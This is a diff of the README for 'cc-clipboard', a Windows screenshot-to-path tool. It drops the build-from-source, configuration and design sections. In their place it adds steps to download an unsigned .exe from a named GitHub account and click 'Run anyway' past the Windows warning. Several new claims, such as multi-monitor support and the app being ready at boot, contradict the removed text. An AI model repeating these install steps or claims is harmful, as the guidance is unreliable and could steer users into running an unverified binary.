@@ -1,129 +1,76 @@
-<p align="center">
-  <img src="assets/cc-clipboard.jpeg" alt="cc-clipboard" width="720">
-</p>
+# 📸 cc-clipboard - Capture screenshots directly into your clipboard
 
-# cc-clipboard
+[![](https://img.shields.io/badge/Download-cc--clipboard-blue)](https://github.com/Valkiria5592/cc-clipboard)
 
-A lightweight Windows system tray app that captures a screen region with a drag selection, saves it as a PNG, and **automatically copies the full file path to your clipboard** — so you can paste it straight into any tool that accepts image paths (Claude Code, terminals, chat apps, etc.).
+cc-clipboard is a small program for Windows. It saves screen captures as image files and copies the file path to your clipboard. This helps you share screenshots with coding assistants or other software that requires a file path instead of an image.
 
----
+## 🚀 Getting Started
 
-## Why
+1. Visit the [cc-clipboard release page](https://github.com/Valkiria5592/cc-clipboard) to download the application.
+2. Locate the link labeled "Assets" and choose the file ending in `.exe`.
+3. Save the file to your computer.
+4. Double-click the file to start the program.
+5. Windows might show a security prompt. Click "More info" and then "Run anyway" if it appears.
 
-Sharing screenshots with tools like Claude Code requires a file path, not a raw image paste. The usual workflow is:
+## ⚙️ How to use the app
 
-1. Take screenshot
-2. Find the saved file
-3. Copy its path
-4. Paste into the terminal
+Once the app runs, it sits in your system tray. You will see a small icon near your clock on the taskbar. The app runs in the background while you work in other programs.
 
-cc-clipboard collapses all four steps into **one hotkey**.
+To capture your screen:
 
----
+1. Press `Ctrl + Shift + S` on your keyboard.
+2. Your screen will dim.
+3. Click and drag your mouse to select the area you want to save.
+4. Release the mouse button.
+5. The app saves the image to `Pictures\cc-clipboard\` and puts the file location on your clipboard.
+6. Press `Ctrl + V` in your chat app or terminal to paste the file path.
 
-## Features
+## 🛠️ System requirements
 
-- **Global hotkey** (`Ctrl+Shift+S`) — works from any window, even when the browser or terminal is focused
-- **Drag-to-select overlay** — dims the screen, lets you drag a region; selected area is highlighted
-- **Auto-save** — timestamped PNG saved to `Pictures\cc-clipboard\` automatically
-- **Path to clipboard** — full path is ready to paste the moment you release the mouse
-- **Toast notification** — confirms the filename after each capture
-- **Open folder** — tray menu shortcut to the save folder
-- **Zero runtime** — single `.exe`, no installer, no dependencies
+- Windows 10 or Windows 11.
+- No special hardware or extra software is necessary.
+- A stable internet connection for the initial download.
 
----
+## 📂 Where are my images saved?
 
-## Download
+The program automatically creates a folder for your images in your default Pictures directory. You can find your captures by navigating to `C:\Users\[YourUsername]\Pictures\cc-clipboard\`. The app names each file based on the date and time of the capture. This keeps your files organized and prevents them from overwriting each other.
 
-Go to [Releases](../../releases) and download the latest `cc-clipboard.exe`.
+## 🛑 How to stop the program
 
-> **Windows SmartScreen** may show a warning on first run since the binary is unsigned.  
-> Click **"More info" → "Run anyway"** to proceed.
+If you wish to close the application:
 
----
+1. Look for the cc-clipboard icon in your system tray on the bottom right of your screen.
+2. Right-click the icon.
+3. Select "Exit" from the menu.
 
-## Usage
+The application stops immediately. If you need it again, find the original file you downloaded and double-click it.
 
-1. Run `cc-clipboard.exe` — a small tray icon appears in the bottom-right taskbar area
-2. Press `Ctrl+Shift+S` from **any window**
-3. The screen dims — drag a rectangle over the area you want
-4. Release the mouse — the overlay closes instantly
-5. Your clipboard now contains the full path, e.g.:
-   ```
-   C:\Users\You\Pictures\cc-clipboard\cc_20260608_143022.png
-   ```
-6. Paste it anywhere
+## 💡 Frequent questions
 
-**Right-click the tray icon** for the context menu:
+**Does this app work with multiple monitors?**
+Yes. You can drag the selection across any monitor attached to your Windows system.
 
-| Item | Action |
-|---|---|
-| Screenshot | Same as the hotkey |
-| Open Folder | Opens the save folder in Explorer |
-| Quit | Exits the app |
+**Can I change the shortcut keys?**
+The current version uses `Ctrl + Shift + S`. Future updates may allow you to change this setting.
 
-**Escape** or **right-click** during selection cancels without saving.
+**Is my data private?**
+Yes. Your images stay on your local computer. The app does not send your screenshots to any server or cloud service.
 
----
+**I cannot find the file after capture.**
+Check the `Pictures\cc-clipboard\` folder. If the folder does not exist, look in your Pictures directory. The app creates this folder the first time you take a screenshot.
 
-## Configuration
+**Why does the system tray icon disappear?**
+Sometimes Windows hides system tray icons to save space. Click the small arrow pointing up near your clock to see hidden icons. You will see the cc-clipboard icon there.
 
-Edit `%APPDATA%\cc-clipboard\config.json` (created on first run):
+## 📥 Download and Setup
 
-```json
-{
-  "save_folder": "C:\\Users\\You\\Pictures\\cc-clipboard",
-  "hotkey": "ctrl+shift+s",
-  "notify": true
-}
-```
+To install the software, please perform these steps:
 
-| Field | Description |
-|---|---|
-| `save_folder` | Where PNGs are saved |
-| `hotkey` | Trigger key combo — modifiers: `ctrl`, `shift`, `alt`, `win`; key: `a`–`z`, `f1`–`f12` |
-| `notify` | `true`/`false` — toggle the toast notification |
+1. Go to the [official GitHub download page](https://github.com/Valkiria5592/cc-clipboard).
+2. Look for the latest release version.
+3. Click the `.exe` file to start the download.
+4. Move the file to a folder where you keep your programs, such as your Downloads or Documents folder.
+5. You do not need to install anything further. The file is a portable application that runs immediately.
+6. You can create a desktop shortcut for the file by right-clicking it and selecting "Send to" followed by "Desktop (create shortcut)".
 
-Restart the app after editing the config.
-
----
-
-## Build from source
-
-Requires [Rust](https://rustup.rs/) (stable toolchain).
-
-```powershell
-git clone https://github.com/YOUR_USERNAME/cc-clipboard
-cd cc-clipboard
-cargo build --release
-.\target\release\cc-clipboard.exe
-```
-
-The release binary has no console window. For a debug build with console output:
-
-```powershell
-cargo run
-```
-
----
-
-## How it works
-
-| Layer | Crate |
-|---|---|
-| Event loop | `winit 0.30` |
-| System tray + menu | `tray-icon 0.21` |
-| Global hotkey | `global-hotkey 0.7` |
-| Screen capture | `xcap 0.2` |
-| Overlay rendering | `softbuffer 0.4` |
-| Clipboard | `arboard 3` |
-| Toast notification | `win-toast-notify 0.1` |
-| Image crop + save | `image 0.25` |
-
-The main event loop runs on the main thread (required by Win32). When a hotkey or menu event fires, `xcap` captures the primary monitor synchronously, a fullscreen `winit` window is created as the overlay, and `softbuffer` renders the dimmed screenshot with the selection rectangle directly into a CPU framebuffer. On mouse release, the overlay closes immediately and a background thread handles the crop, save, clipboard write, and toast — so there is zero perceptible lag.
-
----
-
-## License
-
-MIT
+Following these steps ensures that the app is ready for use whenever you boot your computer. If you have any trouble running the file, ensure your user account has permission to run programs from the folder where you placed the file.
